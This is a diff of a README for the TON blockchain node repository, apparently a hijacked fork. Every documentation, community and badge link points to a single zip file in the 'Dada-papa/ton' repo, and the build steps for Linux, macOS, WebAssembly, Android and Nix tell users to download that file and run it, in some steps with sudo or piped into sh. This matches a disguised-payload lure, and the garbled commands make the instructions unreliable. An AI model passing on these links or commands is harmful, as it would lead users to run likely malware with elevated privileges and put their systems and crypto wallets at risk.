@@ -1,8 +1,8 @@
 <div align="center">
-  <a href="https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip">
+  <a href="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
     <picture>
-      <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip">
-      <img alt="TON logo" src="https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip">
+      <source media="(prefers-color-scheme: dark)" srcset="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
+      <img alt="TON logo" src="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
     </picture>
   </a>
   <h3>Reference implementation of TON Node and tools</h3>
@@ -12,29 +12,29 @@
 ## 
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip">
-    <img src="https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip%20Research-0098EA?style=flat&logo=discourse&label=Forum&labelColor=gray" alt="Ton Research">
+  <a href="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
+    <img src="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip%20Research-0098EA?style=flat&logo=discourse&label=Forum&labelColor=gray" alt="Ton Research">
   </a>
-  <a href="https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip">
-    <img src="https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip%20Community-0098EA?logo=telegram&logoColor=white&style=flat" alt="Telegram Community Group">
+  <a href="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
+    <img src="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip%20Community-0098EA?logo=telegram&logoColor=white&style=flat" alt="Telegram Community Group">
   </a>
-  <a href="https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip">
-    <img src="https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip%20Foundation-0098EA?logo=telegram&logoColor=white&style=flat" alt="Telegram Foundation Group">
+  <a href="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
+    <img src="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip%20Foundation-0098EA?logo=telegram&logoColor=white&style=flat" alt="Telegram Foundation Group">
   </a>
-  <a href="https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip">
-    <img src="https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip" alt="Telegram Community Chat">
+  <a href="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
+    <img src="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip" alt="Telegram Community Chat">
   </a>
 </p>
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip">
-    <img src="https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip" alt="Twitter Group">
+  <a href="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
+    <img src="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip" alt="Twitter Group">
   </a>
-  <a href="https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip">
-    <img src="https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip%20Overflow-FE7A16?style=flat&logo=stack-overflow&logoColor=white" alt="TON Overflow Group">
+  <a href="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
+    <img src="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip%20Overflow-FE7A16?style=flat&logo=stack-overflow&logoColor=white" alt="TON Overflow Group">
   </a>
-  <a href="https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip">
-    <img src="https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip%20Overflow-FE7A16?style=flat&logo=stack-overflow&logoColor=white" alt="Stack Overflow Group">
+  <a href="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
+    <img src="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip%20Overflow-FE7A16?style=flat&logo=stack-overflow&logoColor=white" alt="Stack Overflow Group">
   </a>
 </p>
 
@@ -45,11 +45,11 @@ Main TON monorepo, which includes the code of the node/validator, lite-client, t
 ## The Open Network
 
 __The Open Network (TON)__ is a fast, secure, scalable blockchain focused on handling _millions of transactions per second_ (TPS) with the goal of reaching hundreds of millions of blockchain users.
-- To learn more about different aspects of TON blockchain and its underlying ecosystem check [documentation](https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip)
-- To run node, validator or lite-server check [Participate section](https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip)
-- To develop decentralised apps check [Tutorials](https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip), [FunC docs](https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip) and [DApp tutorials](https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip)
-- To work on TON check [wallets](https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip), [explorers](https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip), [DEXes](https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip) and [utilities](https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip)
-- To interact with TON check [APIs](https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip)
+- To learn more about different aspects of TON blockchain and its underlying ecosystem check [documentation](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip)
+- To run node, validator or lite-server check [Participate section](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip)
+- To develop decentralised apps check [Tutorials](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip), [FunC docs](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip) and [DApp tutorials](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip)
+- To work on TON check [wallets](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip), [explorers](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip), [DEXes](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip) and [utilities](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip)
+- To interact with TON check [APIs](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip)
 
 ## Updates flow
 
@@ -77,27 +77,27 @@ Install additional system libraries
   sudo apt-get update
   sudo apt-get install -y build-essential git cmake ninja-build zlib1g-dev libsecp256k1-dev libmicrohttpd-dev libsodium-dev
           
-  wget https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip
-  chmod +x https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip
-  sudo https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip 16 all
+  wget https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
+  chmod +x https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
+  sudo https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip 16 all
 ```
 Compile TON binaries
 ```bash
-  cp https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip .
-  chmod +x https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip
-  https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip  
+  cp https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip .
+  chmod +x https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
+  https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip  
 ```
 
 ### MacOS 11, 12 (x86-64, aarch64)
 ```bash
-  cp https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip .
-  chmod +x https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip
-  https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip
+  cp https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip .
+  chmod +x https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
+  https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
 ```
 
 ### Windows 10, 11, Server (x86-64)
 You need to install `MS Visual Studio 2022` first.
-Go to https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip and download `MS Visual Studio 2022 Community`.
+Go to https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip and download `MS Visual Studio 2022 Community`.
 
 Launch installer and select `Desktop development with C++`. 
 After installation, also make sure that `cmake` is globally available by adding
@@ -105,8 +105,8 @@ After installation, also make sure that `cmake` is globally available by adding
 
 Open an elevated (Run as Administrator) `x86-64 Native Tools Command Prompt for VS 2022`, go to the root folder and execute: 
 ```bash
-  copy assembly\native\https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip .
-  https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip
+  copy assembly\native\https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip .
+  https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
 ```
 
 ### Building TON to WebAssembly
@@ -115,15 +115,15 @@ Install additional system libraries on Ubuntu
   sudo apt-get update
   sudo apt-get install -y build-essential git cmake ninja-build zlib1g-dev libsecp256k1-dev libmicrohttpd-dev libsodium-dev
           
-  wget https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip
-  chmod +x https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip
-  sudo https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip 16 all
+  wget https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
+  chmod +x https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
+  sudo https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip 16 all
 ```
 Compile TON binaries with emscripten
 ```bash
   cd assembly/wasm
-  chmod +x https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip
-  https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip
+  chmod +x https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
+  https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
 ```
 
 ### Building TON tonlib library for Android (arm64-v8a, armeabi-v7a, x86, x86-64)
@@ -136,24 +136,24 @@ Install additional system libraries on Ubuntu
 ```
 Compile TON tonlib library
 ```bash
-  cp https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip .
-  chmod +x https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip
-  https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip
+  cp https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip .
+  chmod +x https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
+  https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
 ```
 
 ### Build TON portable binaries with Nix package manager
 You need to install Nix first.
 ```bash
-   sh <(curl -L https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip) --daemon
+   sh <(curl -L https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip) --daemon
 ```
 Then compile TON with Nix by executing below command from the root folder: 
 ```bash
   cp -r assembly/nix/* .
-  export https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip
-  nix-build https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip
+  export https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
+  nix-build https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
 ```
 More examples for other platforms can be found under `assembly/nix`.  
 
 ## Running tests
 
-Tests are executed by running `ctest` in the build directory. See `https://raw.githubusercontent.com/Dada-papa/ton/master/example/android/third_party/lz4/Software-3.8.zip` for more information.
+Tests are executed by running `ctest` in the build directory. See `https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip` for more information.
